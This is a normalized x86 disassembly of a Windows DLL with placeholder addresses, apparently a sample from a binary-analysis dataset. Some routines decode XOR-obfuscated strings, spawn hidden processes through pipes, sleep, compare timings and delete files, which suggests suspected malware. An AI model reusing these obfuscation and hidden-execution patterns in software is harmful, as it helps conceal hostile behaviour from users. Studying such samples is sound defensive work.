push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_10079d68
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001d49a
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_1001d49a
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_100617e7
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_1001d4d0
push ebp
mov ebp esp
push ecx
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn 0x10
mov eax [ eax + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x4 ]
push edx
push eax
mov eax [ ecx + 0xf0 ]
call eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x24 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x28 ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x10 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x2c ]
call eax
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x30 ]
call eax
sub_1001d532
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1006b64d
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1006b64d
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1001d628
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
or [ rw-data ] 0xffffffff
jmp r-xdata
push eax
call [ TlsFree@IAT ]
or [ rw-data ] 0xffffffff
mov edi edi
push ebx
mov ebx [ DeleteCriticalSection@IAT ]
push esi
mov esi rw-data
push edi
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
je r-xdata
mov edi [ esi ]
test edi edi
je r-xdata
mov esi rw-data
pop edi
push edi
call ebx
push edi
call sub_10022b5a
and [ esi ] 0x0
pop ecx
add esi 0x8
cmp esi rw-data
jl r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push eax
call ebx
sub_1001d665
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_1004fd6f
mov esi [ eax ]
call sub_1004fd6f
push [ ebp + 0xc ]
and [ eax ] 0x0
push [ ebp + 0x8 ]
call sub_10030c32
fstp [ ebp - 0x8 ]
pop ecx
pop ecx
call sub_1004fd6f
mov eax [ eax ]
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
call sub_1004fd6f
fld [ r--data ]
mov [ eax ] esi
mov eax [ ebp + 0x10 ]
pop esi
jmp r-xdata
test eax eax
jg r-xdata
fld [ ebp - 0x8 ]
dec eax
fmul st1
fstp [ ebp - 0x8 ]
jns r-xdata
fstp st0
fld [ ebp - 0x8 ]
leave
retn
neg eax
dec eax
fld [ ebp - 0x8 ]
fdiv st1
fstp [ ebp - 0x8 ]
jne r-xdata
sub_1001d6d0
push ebp
mov ebp esp
sub esp 0x834
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi ecx
mov ecx [ eax + 0x110 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov ebx [ StrCpyW@IAT ]
mov esi [ ebp - 0x834 ]
lea eax [ ebp - 0x82c ]
mov [ ebp - 0x830 ] 0x0
mov [ ebp - 0x82c ] eax
jmp r-xdata
mov ecx [ edi + 0x4 ]
test eax eax
jne r-xdata
test ecx ecx
je r-xdata
lea eax [ ebp - 0x830 ]
push eax
lea ebx [ ebp - 0x210 ]
call sub_1001cb30
add esp 0x4
test eax eax
je r-xdata
mov eax 0x4
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push ecx
lea edx [ ebp - 0x418 ]
push edx
call ebx
mov eax [ ebp - 0x82c ]
mov esi [ edi + 0x8 ]
test eax eax
jne r-xdata
mov esi [ edi + 0xc ]
lea ecx [ ebp - 0x828 ]
push ecx
lea ebx [ ebp - 0x620 ]
call sub_1004b970
add esp 0x4
test eax eax
je r-xdata
mov eax 0x5
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov dl [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
mov edi [ edi + 0x18 ]
mov ecx [ ebp - 0x830 ]
push edi
push eax
mov [ ebp - 0x834 ] dl
mov eax [ ebp - 0x834 ]
push eax
push ecx
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0x418 ]
push eax
lea edx [ ebp - 0x828 ]
lea ecx [ ebp - 0x620 ]
xor ebx ebx
xor esi esi
call sub_10054e60
test eax eax
jne r-xdata
mov eax 0x6
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edi [ rw-data ]
mov [ edi + 0x104 ] ebx
mov [ edi + 0x10c ] ebx
mov [ edi + 0x108 ] 0x1
call sub_100010b0
mov ecx [ rw-data ]
mov edx [ ecx + 0x110 ]
push edx
call [ ReleaseMutex@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
lea esi [ ebx + 0x8 ]
sub_1001d859
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10055531
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x2
lea eax [ ebp - 0x18 ]
push eax
push 0x2
push ebx
call sub_1001116c
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xd0 ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push 0x200
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_10041dbf
add esp 0x24
test eax eax
je r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001d970
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1008387c
mov eax [ fs : 0x0 ]
push eax
sub esp 0x318
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x310 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x328 ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor edi edi
cmp [ ebx + 0x8 ] edi
je r-xdata
mov eax 0x1
jmp r-xdata
mov [ esp + 0x30 ] edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] edi
mov [ esp + 0x330 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x24 ] edi
lea edx [ esp + 0x9c ]
mov eax 0xda
mov [ esp + 0x2c ] edi
mov [ esp + 0x40 ] edi
call sub_10013830
mov eax [ ebx + 0xa4 ]
sub eax [ ebx + 0xa0 ]
xor esi esi
sar eax 0x3
test eax eax
je r-xdata
mov ecx [ esp + 0x328 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x310 ]
xor ecx esp
call sub_10024145
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x30 ]
mov ecx ebx
lea esi [ esp + 0x44 ]
call sub_10026810
mov [ esp + 0x330 ] 0x3
cmp [ ebx + 0x8 ] edi
je r-xdata
mov edi edi
mov esi [ esp + 0x1c ]
xor eax eax
lea ecx [ esp + 0x2c ]
push ecx
lea ecx [ esp + 0x44 ]
lea edi [ esp + 0x20 ]
call sub_10041440
test eax eax
je r-xdata
cmp [ esp + 0xb0 ] 0x8
jb r-xdata
lea eax [ esp + 0x114 ]
lea edx [ eax + 0x2 ]
inc eax
cmp eax 0x39
jb r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_100542e0
test esi esi
je r-xdata
mov eax [ esp + 0x40 ]
cmp eax 0x1e84800
jge r-xdata
mov esi [ esp + 0x1c ]
xor eax eax
mov [ esp + 0xb0 ] edi
mov [ esp + 0xac ] 0x0
mov [ esp + 0x9c ] ax
test esi esi
je r-xdata
mov edx [ esp + 0x9c ]
push edx
call sub_1006591f
add esp 0x4
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ esp + 0x118 ]
push eax
lea ecx [ esp + 0xa4 ]
call sub_100531b0
mov eax [ ebx + 0xa0 ]
mov ecx [ eax + esi * 8 ]
mov [ esp + 0xb8 ] ecx
mov edx [ eax + esi * 8 + 0x4 ]
lea ecx [ esp + 0x9c ]
lea edi [ esp + 0x1c ]
mov [ esp + 0xbc ] edx
call sub_10043a70
lea ecx [ esp + 0x9c ]
lea edi [ esp + 0x30 ]
call sub_10061900
cmp [ esp + 0xb0 ] 0x8
jb r-xdata
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
lea edx [ esp + 0x14 ]
mov eax 0xb5
call sub_10013830
mov eax edx
push eax
mov eax [ rw-data ]
mov ecx edx
push ecx
push edx
push 0x1
push 0x1
push eax
lea eax [ esp + 0x12c ]
mov [ esp + 0x30 ] 0x1
call sub_1002ed80
test eax eax
jne r-xdata
mov ecx [ rw-data ]
push 0x0
push eax
mov eax [ esp + 0x34 ]
push eax
push ecx
xor edx edx
xor ecx ecx
call sub_10009050
test eax eax
je r-xdata
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov ecx [ ebx + 0xa4 ]
sub ecx [ ebx + 0xa0 ]
inc esi
sar ecx 0x3
cmp esi ecx
jb r-xdata
mov eax [ esp + 0x9c ]
push eax
call sub_1006591f
add esp 0x4
mov eax 0x2
jmp r-xdata
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x34 ]
push eax
lea ecx [ esp + 0x40 ]
push ecx
push edx
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
mov eax [ esp + 0x2c ]
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x40 ]
mov edx [ esp + 0x2c ]
push ecx
push edx
lea eax [ esp + 0x11c ]
call sub_10031770
add esp 0x8
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x2c ]
mov edi [ HeapFree@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_100542e0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
xor eax eax
mov edi 0x7
xor ecx ecx
mov [ esp + 0xb0 ] edi
mov [ esp + 0xac ] eax
mov [ esp + 0x9c ] cx
mov [ esp + 0xb8 ] eax
mov [ esp + 0xbc ] eax
mov [ esp + 0x330 ] 0x2
mov edx [ r--data ]
movsx eax [ edx ]
xor eax 0xff9d
and eax 0xff
lea edx [ esp + 0x14 ]
push edx
mov [ esp + 0x18 ] ax
mov eax edx
push eax
mov [ esp + 0x1e ] cx
mov ecx edx
mov edx [ rw-data ]
push ecx
push 0x1
push 0x1
push edx
lea eax [ esp + 0x12c ]
call sub_1002ed80
test eax eax
jne r-xdata
xor edi edi
mov esi [ esp + 0x1c ]
cmp esi [ esp + 0x20 ]
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov esi [ esp + 0x1c ]
cmp esi [ esp + 0x20 ]
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov edx [ ebx + 0xa4 ]
mov ecx [ ebx + 0xa0 ]
cmp ecx edx
je r-xdata
mov eax [ esi + 0x1c ]
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov edx [ ebx + 0xa4 ]
mov ecx [ ebx + 0xa0 ]
cmp ecx edx
je r-xdata
mov edx [ esi + 0x1c ]
push edx
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call edi
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov eax 0x3
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x40 ]
push eax
push ecx
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
cmp [ esp + 0x18 ] 0x0
je r-xdata
mov eax edx
cmp edx edx
je r-xdata
xor eax eax
lea ecx [ ecx ]
mov eax edx
cmp edx edx
je r-xdata
lea edx [ esp + 0x114 ]
push edx
call sub_10018ea0
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0xa4 ] ecx
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
inc eax
cmp eax 0x14
jb r-xdata
jmp r-xdata
mov [ ebx + 0xa4 ] ecx
mov esi [ eax ]
mov [ ecx ] esi
mov esi [ eax + 0x4 ]
mov [ ecx + 0x4 ] esi
add eax 0x8
add ecx 0x8
cmp eax edx
jne r-xdata
lea ecx [ esp + 0x114 ]
push ecx
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x142
call sub_10013830
lea eax [ esp + 0x114 ]
push eax
call [ DeleteFileW@IAT ]
lea edx [ esp + 0x9c ]
mov eax 0x95
call sub_10013830
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_100542e0
cmp [ esp + 0x1c ] 0x0
je r-xdata
inc eax
cmp eax 0x3b
jb r-xdata
lea eax [ esp + 0x44 ]
mov [ esp + 0x330 ] 0x1
call sub_100542e0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
mov [ esp + 0x330 ] 0x1
mov eax [ esp + 0x44 ]
mov esi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x4c ]
test eax eax
je r-xdata
push eax
call esi
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov esi [ esp + 0x1c ]
mov edi [ esp + 0x20 ]
mov eax esi
call sub_10020290
push esi
call sub_1006591f
add esp 0x4
mov esi [ esp + 0x30 ]
test esi esi
je r-xdata
mov edi [ esp + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ esp + 0x50 ]
test eax eax
je r-xdata
push eax
call esi
mov eax 0x5
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x34 ]
push ecx
lea edx [ esp + 0x40 ]
push edx
push eax
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
mov eax 0x4
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x34 ]
push edx
lea eax [ esp + 0x40 ]
push eax
push ecx
push esi
call sub_10015b10
push esi
call sub_1006591f
add esp 0x14
push esi
call sub_1006591f
add esp 0x4
mov ebx 0x7
cmp [ esp + 0x54 ] 0x0
je r-xdata
push eax
call esi
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
add esi 0x24
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov eax [ esp + 0x58 ]
test eax eax
je r-xdata
mov [ esp + 0x54 ] 0x0
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov esi [ esp + 0x1c ]
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ esp + 0x60 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ esp + 0x94 ] 0x0
je r-xdata
push eax
call esi
cmp [ esp + 0x98 ] 0x0
je r-xdata
mov [ esp + 0x94 ] 0x0
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
lea esi [ esp + 0x98 ]
call sub_10024550
mov ebx [ esp + 0x30 ]
test ebx ebx
je r-xdata
cmp esi [ esp + 0x20 ]
je r-xdata
xor eax eax
mov edi [ esp + 0x34 ]
mov esi ebx
cmp ebx edi
je r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
push ebx
call sub_1006591f
add esp 0x4
nop
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x24
cmp esi [ esp + 0x20 ]
jne r-xdata
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
add esi 0x1c
cmp esi edi
jne r-xdata
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x4
cmp [ esi + 0x14 ] 0x8
jb r-xdata
sub_1001e0aa
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
lea eax [ ecx + eax * 2 ]
push eax
call sub_10046b50
add esp 0xc
mov ecx [ ecx ]
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0x10 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
mov ecx [ ecx ]
pop ebp
retn 0xc
sub_1001e0f0
push ebp
mov ebp esp
sub esp 0x30c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ rw-data ]
push esi
push edi
xor edi edi
push 0x208
lea eax [ ebp - 0x280 ]
push edi
push eax
mov [ ebp - 0x2ac ] edi
mov [ ebp - 0x2b4 ] edi
call sub_10079a10
mov ecx [ r--data ]
add esp 0xc
mov [ ebp - 0x284 ] edi
xor eax eax
lea ecx [ ecx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xffee
and edx 0xff
mov [ ebp + eax * 2 - 0x60 ] dx
inc eax
cmp eax 0x9
jb r-xdata
mov esi [ ebx + 0xda0 ]
xor eax eax
mov [ ebp - 0x4e ] ax
cmp esi [ ebx + 0xda4 ]
je r-xdata
push edi
lea edx [ ebp - 0x2c0 ]
push edx
lea eax [ ebp - 0x2a4 ]
push eax
lea ecx [ ebp - 0x288 ]
push ecx
mov [ ebp - 0x2c0 ] 0xc
mov [ ebp - 0x2b8 ] 0x1
mov [ ebp - 0x2bc ] edi
call [ CreatePipe@IAT ]
test eax eax
je r-xdata
mov edi [ StrStrIW@IAT ]
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x288 ]
push edi
push 0x1
push edx
call [ SetHandleInformation@IAT ]
test eax eax
je r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
push 0x44
lea eax [ ebp - 0x308 ]
push edi
push eax
call sub_10079a10
or [ ebp - 0x2dc ] 0x100
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
add esp 0xc
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x308 ] 0x44
xor eax eax
nop
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor al al
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
add esi 0x1c
cmp esi [ ebx + 0xda4 ]
jne r-xdata
lea ecx [ ebp - 0x60 ]
push ecx
push eax
call edi
test eax eax
je r-xdata
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff83
and edx 0xff
mov [ ebp + eax * 2 - 0x74 ] dx
inc eax
cmp eax 0x9
jb r-xdata
push 0x104
lea ecx [ ebp - 0x280 ]
push ecx
lea edx [ ebp - 0x74 ]
xor eax eax
push edx
mov [ ebp - 0x62 ] ax
call [ ExpandEnvironmentStringsW@IAT ]
mov ecx [ r--data ]
xor eax eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x4c ] dx
inc eax
cmp eax 0xa
jb r-xdata
mov ebx [ CreateProcessW@IAT ]
lea ecx [ ebp - 0x2a0 ]
push ecx
lea edx [ ebp - 0x308 ]
push edx
push edi
push edi
push 0x8000000
push 0x1
xor eax eax
push edi
mov [ ebp - 0x38 ] ax
push edi
lea eax [ ebp - 0x4c ]
push eax
lea ecx [ ebp - 0x280 ]
push ecx
call ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x2a0 ]
mov esi [ WaitForSingleObject@IAT ]
push 0xffffffff
push edx
call esi
mov edx [ ebp - 0x288 ]
push edi
mov edi [ ReadFile@IAT ]
lea eax [ ebp - 0x284 ]
push eax
push 0x14
lea ecx [ ebp - 0x34 ]
push ecx
push edx
call edi
mov eax [ ebp - 0x284 ]
push 0x1d4c0
mov [ ebp + eax - 0x34 ] 0x0
call [ Sleep@IAT ]
push 0x44
lea ecx [ ebp - 0x308 ]
push 0x0
push ecx
call sub_10079a10
or [ ebp - 0x2dc ] 0x100
add esp 0xc
xor eax eax
mov [ ebp - 0x2a0 ] eax
mov [ ebp - 0x29c ] eax
mov [ ebp - 0x298 ] eax
mov [ ebp - 0x294 ] eax
mov eax [ ebp - 0x2a4 ]
lea edx [ ebp - 0x2a0 ]
push edx
mov [ ebp - 0x2c8 ] eax
mov [ ebp - 0x2cc ] eax
lea eax [ ebp - 0x308 ]
push eax
push 0x0
push 0x0
push 0x8000000
push 0x1
push 0x0
push 0x0
lea ecx [ ebp - 0x4c ]
push ecx
lea edx [ ebp - 0x280 ]
push edx
mov [ ebp - 0x308 ] 0x44
call ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x2a0 ]
push 0xffffffff
push eax
call esi
mov eax [ ebp - 0x288 ]
xor esi esi
push esi
lea ecx [ ebp - 0x284 ]
push ecx
push 0x14
lea edx [ ebp - 0x20 ]
push edx
push eax
mov [ ebp - 0x284 ] esi
call edi
mov ecx [ ebp - 0x284 ]
mov [ ebp + ecx - 0x20 ] 0x0
jmp r-xdata
movsx edx [ ebp + esi - 0x34 ]
push edx
call sub_100318af
add esp 0x4
test eax eax
jne r-xdata
mov ebx esi
inc esi
cmp esi 0x14
jb r-xdata
mov edi [ r--data ]
xor cl cl
xor eax eax
lea esp [ esp ]
inc esi
cmp esi 0x14
jb r-xdata
mov ebx [ ebp - 0x2ac ]
jmp r-xdata
mov dl [ eax + edi ]
xor dl cl
xor dl 0x68
inc cl
mov [ ebp + eax - 0xc ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x290 ]
push eax
lea ecx [ ebp - 0x2a8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
lea eax [ ebp + ebx - 0x34 ]
push eax
mov [ ebp - 0x7 ] 0x0
call sub_10048a6a
lea ecx [ ebp - 0x28c ]
push ecx
lea edx [ ebp - 0x2b0 ]
push edx
lea eax [ ebp - 0xc ]
push eax
lea ecx [ ebp + esi - 0x20 ]
push ecx
call sub_10048a6a
mov edx [ ebp - 0x2b0 ]
add esp 0x20
sub edx [ ebp - 0x2a8 ]
je r-xdata
movsx eax [ ebp + esi - 0x20 ]
push eax
call sub_100318af
add esp 0x4
test eax eax
jne r-xdata
mov esi [ ebp - 0x2b4 ]
xor esi esi
mov ecx [ ebp - 0x28c ]
sub ecx [ ebp - 0x290 ]
cmp ecx 0x2
jge r-xdata
mov eax [ ebp - 0x28c ]
sub eax [ ebp - 0x290 ]
add eax 0x3c
cmp eax 0x2
jge r-xdata
mov al 0x1
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1001e530
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
mov [ esi + 0x8 ] 0x0
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x4 ]
lea edx [ esi + 0xc ]
push edx
push ecx
push eax
call sub_10011560
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x14
sub_1001e573
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1002f261
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
